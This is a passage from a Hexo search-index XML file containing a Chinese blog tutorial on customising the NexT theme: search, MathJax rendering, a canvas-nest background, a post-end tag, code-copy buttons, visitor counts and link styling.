<strong><em>主题配置文件</em></strong>：添加 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr />
<ul>
<li>引用示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
靡不有初 鲜克有终
<p>
<p>
<br>《诗经》
</blockquote></li>
</ul>
<hr />
<ul>
<li>更大更有吸引力的图片来源于<code>&lt;img src="/image-url" class="full-image" /&gt;</code></li>
</ul>
<hr />
<ul>
<li>Bootstrap Callout使用方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
<div class="note default">
            <p>default</p>
          </div>
<div class="note primary">
            <p>primary</p>
          </div>
<div class="note success">
            <p>success</p>
          </div>
<div class="note info">
            <p>info</p>
          </div>
<div class="note warning">
            <p>warning</p>
          </div>
<div class="note danger">
            <p>danger</p>
          </div>
<hr />
<h1 id="x3-latex配置">0x3 LaTex配置</h1>
<blockquote>
<p>我这边pandoc总是出错，于是转用了kramed</p>
</blockquote>
<p>终端输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>主题配置文件</em></strong></p>
<blockquote>
<p>为了加快渲染速度，per_page我选的true，如果嫌麻烦可以直接false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">  per_page: true</span><br><span class="line">  </span><br><span class="line">  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">    mhchem: false</span><br></pre></td></tr></table></figure>
<p>记得在需要渲染的md加入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the <span class="math inline">\(X_{n-1}\)</span></p>
<blockquote>
<p>不过渲染后就导致写md时多了几个规矩</p>
<ol type="1">
<li>---的上下必须各空一格</li>
</ol>
</blockquote>
<p><a
href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">【公式】KaTeX
使用指南（洛谷特供） - 白色过膝袜 - 洛谷博客 (luogu.com.cn)</a></p>
<h1 id="x4-hexo-x-next-美化">0x4 Hexo x Next 美化</h1>
<ul>
<li>动态背景 在<strong><em>站点目录</em></strong>打开git，输入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure> 在<strong><em>主题配置文件</em></strong>中加入
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>记得把其他的动态背景关闭呀，比如</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">  canvas_lines: true</span><br><span class="line">  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br></pre></td></tr></table></figure>
<hr />
<ul>
<li>文章结尾
在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font
Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
</ul>
<hr />
<ul>
<li>代码块复制 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>回到顶部与阅读进度 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure> 附一些参考资料XD~</li>
</ul>
<p><a
href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科
(baidu.com)</a></p>
<hr />
<ul>
<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>链接样式
修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<p>参考文章👇</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo
NexT主题美化总结 | MickeyMiao</a></p>
<p>深度美化-放着吃灰</p>
<p><a
href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a>
<a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey
管理你的博客 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>Geek tech</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
</search>
